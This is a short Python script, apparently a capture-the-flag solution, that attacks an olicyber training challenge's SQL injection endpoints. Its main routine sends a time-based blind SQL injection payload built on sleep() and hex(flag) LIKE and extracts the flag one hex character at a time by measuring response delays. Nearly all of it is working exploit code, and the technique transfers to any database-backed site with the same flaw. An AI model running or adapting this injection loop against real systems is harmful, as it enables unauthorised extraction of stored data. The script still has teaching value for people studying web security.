import requests
from time import time


class Inj:
    def __init__(self, host):

        self.sess = requests.Session()  # Start the session. We want to save the cookies
        self.base_url = "{}/api/".format(host)
        print(self.base_url)
        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + "get_token")
        resp = resp.json()
        print(resp)
        self.token = resp["token"]

    def _do_raw_req(self, url, query):
        headers = {"X-CSRFToken": self.token}
        data = {"query": query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + "logic"
        response = self._do_raw_req(url, query)
        return response["result"], response["sql_error"]

    def union(self, query):
        url = self.base_url + "union"
        response = self._do_raw_req(url, query)
        return response["result"], response["sql_error"]

    def blind(self, query):
        url = self.base_url + "blind"
        response = self._do_raw_req(url, query)
        return response["result"], response["sql_error"]

    def time(self, query):
        url = self.base_url + "time"
        response = self._do_raw_req(url, query)
        return response["result"], response["sql_error"]


if __name__ == "__main__":
    inj = Inj("http://web-17.challs.olicyber.it")

    end = False
    flag = ""
    alphabet = "0123456789ABCDEF"

    while not end:
        for c in alphabet:
            past_time = time()
            f = flag + c
            inj.time(
                f"1' and (select sleep(1) from flags where hex(flag) like '{f}%')='1"
            )
            current_time = time()
            if current_time - past_time > 1:
                flag = flag + c
                print(flag)
                break
        else:
            end = True
            break

    flag = bytes.fromhex(flag).decode()
    print("flag:", flag)
